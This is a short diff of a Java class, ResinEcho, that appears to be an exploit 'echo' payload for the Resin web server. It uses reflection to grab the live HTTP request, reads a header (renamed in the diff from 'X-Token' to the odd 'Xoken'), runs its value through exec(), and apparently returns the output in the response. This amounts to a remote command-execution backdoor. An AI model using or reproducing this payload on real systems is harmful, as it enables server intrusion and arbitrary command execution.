@@ -32,7 +32,7 @@ public class ResinEcho {
 
                 if (value.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                     Object request = value;
-                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
+                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "Xoken");
                     String result = exec(header);
                     Object response = request.getClass().getMethod("createResponse").invoke(request);
                     Method responseStreamMethod = response.getClass().getDeclaredMethod("createResponseStream");
